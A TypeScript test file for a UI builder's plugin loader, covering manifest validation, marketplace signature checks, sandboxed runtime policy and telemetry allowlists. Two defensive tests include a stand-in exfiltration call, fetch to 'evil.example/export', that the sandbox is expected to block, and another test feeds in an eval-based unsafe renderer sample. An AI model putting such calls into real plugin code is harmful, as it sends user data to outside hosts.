/**
 * Component Plugin Loader Tests
 *
 * Tests for the secure plugin loading system, including validation,
 * version compatibility checks, and security policy enforcement.
 *
 * @doc.type test
 * @doc.purpose Validate plugin loading security and compatibility
 * @doc.layer product
 * @doc.pattern Security Test
 */

import { render, screen } from '@testing-library/react';
import { describe, it, expect, beforeEach, vi } from 'vitest';
import {
  ComponentPluginLoader,
  getCurrentPluginRuntimeEnvironment,
  type ComponentPackageManifest,
} from '../pluginLoader';
import {
  COMPONENT_PACKAGE_SIGNATURE_ALGORITHM,
  computeComponentPackageIntegrityDigest,
  type ComponentPackageSignature,
} from '../../../../services/plugins/ComponentPackageSigning';
import { rendererManifestRegistry } from '../rendererManifest';
import type { ComponentInstance } from '@ghatana/ui-builder';
import type { BuilderRendererManifest } from '../rendererManifest';

describe('ComponentPluginLoader', () => {
  let loader: ComponentPluginLoader;

  beforeEach(() => {
    loader = new ComponentPluginLoader();
  });

  describe('validation', () => {
    it('should reject manifest without package name', () => {
      const manifest: ComponentPackageManifest = {
        packageName: '',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Package name is required');
    });

    it('should reject manifest without version', () => {
      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '',
        minBuilderVersion: '1.0.0',
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Package version is required');
    });

    it('should reject manifest without minimum builder version', () => {
      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '',
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Minimum builder version is required');
    });

    it('should reject manifest with version below minimum', () => {
      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '2.0.0', // Higher than current (1.0.0)
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('below minimum required version'))).toBe(true);
    });

    it('should reject manifest with version above maximum', () => {
      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '0.5.0',
        maxBuilderVersion: '0.9.0', // Lower than current (1.0.0)
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('exceeds maximum supported version'))).toBe(true);
    });

    it('should warn when package provides no renderers', () => {
      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.warnings).toContain('Package provides no renderers');
    });

    it('should reject renderer without contract name', () => {
      const renderer: BuilderRendererManifest = {
        contractName: '',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('has no contract name'))).toBe(true);
    });

    it('should reject renderer without render function', () => {
      const renderer = {
        contractName: 'TestComponent',
        render: undefined as any,
      } as BuilderRendererManifest;

      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('has no render function'))).toBe(true);
    });

    it('should accept valid manifest', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('rejects marketplace packages without a signature envelope', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'MarketplaceCard',
        render: () => null,
      };
      const manifest: ComponentPackageManifest = {
        packageName: '@marketplace/card-pack',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        distribution: {
          source: 'marketplace',
          marketplacePackageId: 'pkg_card_pack',
        },
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Marketplace package signature is required');
    });

    it('accepts marketplace packages only when signature subject and digest match', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'MarketplaceCard',
        render: () => null,
      };
      const unsignedManifest: ComponentPackageManifest = {
        packageName: '@marketplace/card-pack',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          allowedDomains: ['api.ghatana.com'],
        },
        distribution: {
          source: 'marketplace',
          marketplacePackageId: 'pkg_card_pack',
        },
      };
      const manifest: ComponentPackageManifest = {
        ...unsignedManifest,
        distribution: {
          ...unsignedManifest.distribution,
          signature: createMarketplaceSignature(unsignedManifest),
        },
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('rejects marketplace packages when the signature was issued for another package', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'MarketplaceCard',
        render: () => null,
      };
      const manifest: ComponentPackageManifest = {
        packageName: '@marketplace/card-pack',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        distribution: {
          source: 'marketplace',
          marketplacePackageId: 'pkg_card_pack',
        },
      };
      const signature = createMarketplaceSignature(manifest, {
        subject: {
          packageName: '@marketplace/other-pack',
          version: '1.0.0',
          marketplacePackageId: 'pkg_card_pack',
        },
      });

      const result = loader.validatePackage({
        ...manifest,
        distribution: {
          ...manifest.distribution,
          signature,
        },
      });

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Package signature subject package name does not match manifest');
    });

    it('rejects expired marketplace package signatures before loading renderers', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'ExpiredMarketplaceCard',
        render: () => null,
      };
      const manifest: ComponentPackageManifest = {
        packageName: '@marketplace/expired-card-pack',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        distribution: {
          source: 'marketplace',
          marketplacePackageId: 'pkg_expired_card_pack',
        },
      };
      const result = loader.loadPackage({
        ...manifest,
        distribution: {
          ...manifest.distribution,
          signature: createMarketplaceSignature(manifest, {
            expiresAt: '2024-01-01T00:00:00.000Z',
          }),
        },
      });

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Package signature has expired');
      expect(loader.getLoadedPackages()).toHaveLength(0);
      expect(rendererManifestRegistry.get('ExpiredMarketplaceCard')).toBeNull();
    });

    it('rejects marketplace packages when signed digest no longer matches manifest payload', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'MarketplaceCard',
        render: () => null,
      };
      const manifest: ComponentPackageManifest = {
        packageName: '@marketplace/card-pack',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        distribution: {
          source: 'marketplace',
          marketplacePackageId: 'pkg_card_pack',
        },
      };
      const signature = createMarketplaceSignature({
        ...manifest,
        renderers: [
          {
            contractName: 'DifferentMarketplaceCard',
            render: () => null,
          },
        ],
      });

      const result = loader.validatePackage({
        ...manifest,
        distribution: {
          ...manifest.distribution,
          signature,
        },
      });

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Package signature digest does not match manifest payload');
    });

    it('loads marketplace packages only after caller-provided signature verification succeeds', async () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'VerifiedMarketplaceCard',
        render: () => null,
      };
      const unsignedManifest: ComponentPackageManifest = {
        packageName: '@marketplace/verified-card-pack',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        distribution: {
          source: 'marketplace',
          marketplacePackageId: 'pkg_verified_card_pack',
        },
      };
      const manifest: ComponentPackageManifest = {
        ...unsignedManifest,
        distribution: {
          ...unsignedManifest.distribution,
          signature: createMarketplaceSignature(unsignedManifest),
        },
      };
      const verifier = vi.fn(async () => ({ valid: true }));

      const result = await loader.loadMarketplacePackage(manifest, verifier);

      expect(result.isValid).toBe(true);
      expect(loader.getLoadedPackages()).toHaveLength(1);
      expect(rendererManifestRegistry.get('VerifiedMarketplaceCard')).toBe(renderer);
      expect(verifier).toHaveBeenCalledWith(
        expect.objectContaining({
          packageName: '@marketplace/verified-card-pack',
          marketplacePackageId: 'pkg_verified_card_pack',
          rendererContracts: ['VerifiedMarketplaceCard'],
        }),
        manifest.distribution?.signature,
      );
    });

    it('does not register marketplace renderers when external signature verification fails', async () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'RejectedMarketplaceCard',
        render: () => null,
      };
      const unsignedManifest: ComponentPackageManifest = {
        packageName: '@marketplace/rejected-card-pack',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        distribution: {
          source: 'marketplace',
          marketplacePackageId: 'pkg_rejected_card_pack',
        },
      };
      const manifest: ComponentPackageManifest = {
        ...unsignedManifest,
        distribution: {
          ...unsignedManifest.distribution,
          signature: createMarketplaceSignature(unsignedManifest),
        },
      };
      const verifier = vi.fn(async () => ({
        valid: false,
        errors: ['Marketplace trust service rejected package signature'],
      }));

      const result = await loader.loadMarketplacePackage(manifest, verifier);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Marketplace trust service rejected package signature');
      expect(loader.getLoadedPackages()).toHaveLength(0);
      expect(rendererManifestRegistry.get('RejectedMarketplaceCard')).toBeNull();
    });
  });

  describe('security policy', () => {
    it('should reject renderers with unsafe source code', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'UnsafeComponent',
        render: () => null,
        sourceCode: 'export const UnsafeComponent = () => <div>{eval("2+2")}</div>;',
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'unsafe-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some((error) => error.includes('blocked by security assessment'))).toBe(true);
    });

    it('should require allowlisted elevated permissions for risky renderers', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'RiskyComponent',
        render: () => null,
        sourceCode: 'export const RiskyComponent = () => { return <button onClick={() => fetch("https://api.example.com")}>Run</button>; };',
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'risky-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const denied = loader.validatePackage(manifest);
      expect(denied.isValid).toBe(false);
      expect(denied.errors.some((error) => error.includes('requires elevated permissions'))).toBe(true);

      loader.allowPackage('risky-package');
      const elevatedManifest: ComponentPackageManifest = {
        ...manifest,
        securityPolicy: {
          requiresElevatedPermissions: true,
        },
      };
      const allowed = loader.validatePackage(elevatedManifest);

      expect(allowed.isValid).toBe(true);
    });

    it('should reject package requiring elevated permissions if not allowed', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'secure-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          requiresElevatedPermissions: true,
        },
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('requires elevated permissions'))).toBe(true);
    });

    it('should reject telemetry declarations without elevated permissions', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TelemetryComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'telemetry-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          allowedTelemetryEvents: ['component.rendered'],
        },
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain(
        'Package telemetry-package declares telemetry events but does not request elevated permissions',
      );
    });

    it('should accept package requiring elevated permissions if allowed', () => {
      loader.allowPackage('secure-package');

      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'secure-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          requiresElevatedPermissions: true,
        },
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(true);
    });
  });

  describe('loading and unloading', () => {
    it('should load valid package and register renderers', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const result = loader.loadPackage(manifest);

      expect(result.isValid).toBe(true);
      expect(loader.getLoadedPackages()).toHaveLength(1);
      expect(loader.getRuntimeEnvironment('test-package')).not.toBeNull();
    });

    it('should not load invalid package', () => {
      const manifest: ComponentPackageManifest = {
        packageName: '',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [],
      };

      const result = loader.loadPackage(manifest);

      expect(result.isValid).toBe(false);
      expect(loader.getLoadedPackages()).toHaveLength(0);
    });

    it('should unload package and unregister renderers', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      loader.loadPackage(manifest);
      expect(loader.getLoadedPackages()).toHaveLength(1);

      loader.unloadPackage('test-package');
      expect(loader.getLoadedPackages()).toHaveLength(0);
      expect(loader.getRuntimeEnvironment('test-package')).toBeNull();
    });

    it('creates a runtime environment that enforces plugin policy at call time', async () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'runtime-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          allowedDomains: ['api.ghatana.com'],
        },
      };

      const result = loader.loadPackage(manifest);
      const runtime = loader.getRuntimeEnvironment('runtime-package');

      expect(result.isValid).toBe(true);
      expect(runtime?.sandboxAttribute).toContain('allow-scripts');
      await expect(runtime?.fetch('https://evil.example/export')!).rejects.toThrow('Plugin network request blocked');
      expect(() => runtime?.useStorage('localStorage')).toThrow('Plugin storage access blocked');
    });

    it('guards renderer execution, blocks global fetch, and restores globals afterward', async () => {
      const originalFetch = vi.fn(() => Promise.resolve(new Response('{}', { status: 200 })));
      vi.stubGlobal('fetch', originalFetch);

      const renderer: BuilderRendererManifest = {
        contractName: 'GuardedComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'guarded-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          allowedDomains: ['api.ghatana.com'],
        },
      };

      expect(loader.loadPackage(manifest).isValid).toBe(true);
      let blockedRequest: Promise<Response> | null = null;

      const activeEnvironment = loader.executeWithRuntimeGuard('guarded-package', (env) => {
        expect(getCurrentPluginRuntimeEnvironment()).toBe(env);
        blockedRequest = globalThis.fetch('https://evil.example/export');
        return env;
      });

      expect(activeEnvironment).toBe(loader.getRuntimeEnvironment('guarded-package'));
      expect(getCurrentPluginRuntimeEnvironment()).toBeNull();
      expect(globalThis.fetch).toBe(originalFetch);
      await expect(blockedRequest).rejects.toThrow('Plugin network request blocked');
      expect(originalFetch).not.toHaveBeenCalled();
    });

    it('restricts elevated plugin telemetry to declared events only', () => {
      loader.allowPackage('telemetry-package');
      const renderer: BuilderRendererManifest = {
        contractName: 'TelemetryComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'telemetry-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          requiresElevatedPermissions: true,
          allowedTelemetryEvents: ['component.rendered'],
        },
      };

      expect(loader.loadPackage(manifest).isValid).toBe(true);
      const runtime = loader.getRuntimeEnvironment('telemetry-package');

      expect(runtime?.emitTelemetry('component.rendered', { contractName: 'TelemetryComponent' })).toBe(true);
      expect(runtime?.emitTelemetry('component.secret-export')).toBe(false);
      expect(runtime?.policy.telemetry.eventAllowlist).toEqual(['component.rendered']);
    });

    it('keeps elevated plugin telemetry disabled until events are explicitly declared', () => {
      loader.allowPackage('silent-package');
      const renderer: BuilderRendererManifest = {
        contractName: 'SilentComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'silent-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          requiresElevatedPermissions: true,
        },
      };

      expect(loader.loadPackage(manifest).isValid).toBe(true);
      const runtime = loader.getRuntimeEnvironment('silent-package');

      expect(runtime?.emitTelemetry('component.rendered')).toBe(false);
      expect(runtime?.policy.telemetry.allowTelemetry).toBe(false);
    });

    it('falls back to the residual renderer after a plugin package is unloaded', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'PackageWidget',
        render: () => 'Loaded package widget',
      };
      const manifest: ComponentPackageManifest = {
        packageName: 'fallback-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      expect(loader.loadPackage(manifest).isValid).toBe(true);
      expect(rendererManifestRegistry.get('PackageWidget')).toBe(renderer);

      loader.unloadPackage('fallback-package');

      expect(rendererManifestRegistry.get('PackageWidget')).toBeNull();
      const fallback = rendererManifestRegistry.getFallbackRenderer();
      const instance = {
        id: 'package-widget',
        contractName: 'PackageWidget',
        props: {},
        slots: {},
        bindings: [],
        metadata: {
          residualReason: 'Plugin package was unloaded before render.',
        },
      } satisfies ComponentInstance;

      expect(fallback).not.toBeNull();
      render(fallback!.render(instance, { default: null, actions: null }, { mode: 'preview' }));

      expect(screen.getByTestId('fallback-renderer-PackageWidget')).toHaveTextContent(
        'Plugin package was unloaded before render.',
      );
    });
  });

  describe('allowlist', () => {
    it('should allow and disallow packages', () => {
      expect(loader.isPackageAllowed('test-package')).toBe(false);

      loader.allowPackage('test-package');
      expect(loader.isPackageAllowed('test-package')).toBe(true);

      loader.disallowPackage('test-package');
      expect(loader.isPackageAllowed('test-package')).toBe(false);
    });
  });
});

function createMarketplaceSignature(
  manifest: ComponentPackageManifest,
  override: Partial<ComponentPackageSignature> = {},
): ComponentPackageSignature {
  const marketplacePackageId = manifest.distribution?.marketplacePackageId;
  const digest = computeComponentPackageIntegrityDigest({
    packageName: manifest.packageName,
    version: manifest.version,
    minBuilderVersion: manifest.minBuilderVersion,
    maxBuilderVersion: manifest.maxBuilderVersion,
    rendererContracts: manifest.renderers.map((renderer) => renderer.contractName),
    securityPolicy: manifest.securityPolicy,
    marketplacePackageId,
  });

  return {
    algorithm: COMPONENT_PACKAGE_SIGNATURE_ALGORITHM,
    keyId: 'yappc-marketplace-root-2026',
    issuedAt: '2026-01-01T00:00:00.000Z',
    expiresAt: '2099-01-01T00:00:00.000Z',
    subject: {
      packageName: manifest.packageName,
      version: manifest.version,
      ...(marketplacePackageId ? { marketplacePackageId } : {}),
    },
    digest,
    signature: `yappc-sig-v1:${digest}`,
    ...override,
  };
}
